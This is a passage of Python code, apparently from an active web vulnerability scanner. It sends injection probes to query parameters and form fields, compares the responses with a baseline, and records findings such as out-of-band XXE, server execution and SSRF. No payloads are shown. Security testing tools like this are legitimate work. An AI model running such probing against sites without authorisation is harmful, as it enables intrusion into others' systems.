                            evidence_line = "xxe_oob"

                if not hit:
                    continue

                proof = build_proof(
                    endpoint=target,
                    method=method,
                    parameter=field,
                    baseline_status=baseline_status,
                    probe_status=p_status,
                    baseline_body=baseline_body,
                    probe_body=p_body,
                    payload_class=spec.payload_class,
                    new_evidence=new_evidence,
                    response_classification=resp_class,
                    confidence=confidence,
                    validation_state=validation_state,
                    evidence_line=evidence_line,
                )
                add(
                    spec.category,
                    severity,
                    f"Active {spec.category} {detail_bit} on {source} '{field}' at {target}",
                    evidence_line or detail_bit,
                    {
                        "verification": verification,
                        "confidence": confidence,
                        "confidence_reason": validation_state,
                        "proof": proof,
                        "validation": (
                            "confirmed"
                            if validation_state
                            in (STATE_SERVER_EXEC, STATE_BROWSER_EXEC, STATE_OOB_CALLBACK)
                            else "unverified"
                        ),
                    },
                )
            except Exception:
                continue

    # --- GET query params ---
    parsed = urlparse(url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    if pairs:
        values = {n: v for n, v in pairs}
        baseline_ok = False
        baseline_body = ""
        baseline_status = 0
        baseline_final = ""
        try:
            base_resp = await _send("GET", url, values)
            baseline_status, baseline_body, base_hdrs, baseline_final = _meta(base_resp)
            baseline_ok = not is_contaminated(
                classify_response(baseline_status, baseline_body, base_hdrs)
            )
        except Exception:
            baseline_ok = False

        ordered = sorted(
            pairs,
            key=lambda item: (
                0
                if sql_names.match(item[0])
                or _ssrf_names(item[0])
                or _redirect_names(item[0])
                or re.match(r"(?i)^(file|path|cmd|q|search)$", item[0])
                else 1
            ),
        )
        for name, _ in ordered[: max(1, int(settings.max_params or 8))]:
            await probe_field(
                "GET",
                url,
                name,
                values,
                "query param",
                baseline_body,
                baseline_status,
                baseline_ok,
                baseline_final,
            )

    # --- Forms ---
    if forms:
        for form in (forms or [])[: max(0, int(settings.max_forms or 3))]:
            action = form.get("action") or url
            method = (form.get("method") or "GET").upper()
            if mutation_blocked(action, method):
                continue
            fields = [f for f in (form.get("fields") or []) if f][: settings.max_params]
            if not fields:
                continue
            values = {f: "test" for f in form.get("fields", []) if f}
            baseline_ok = False
            baseline_body = ""
            baseline_status = 0
            baseline_final = ""
            try:
                base_resp = await _send(method, action, values)
                baseline_status, baseline_body, base_hdrs, baseline_final = _meta(base_resp)
                baseline_ok = not is_contaminated(
                    classify_response(baseline_status, baseline_body, base_hdrs)
                )
            except Exception:
                baseline_ok = False
            for field in fields:
                await probe_field(
                    method,
                    action,
                    field,
                    values,
                    "form field",
                    baseline_body,
                    baseline_status,
                    baseline_ok,
                    baseline_final,
                )

    return findings
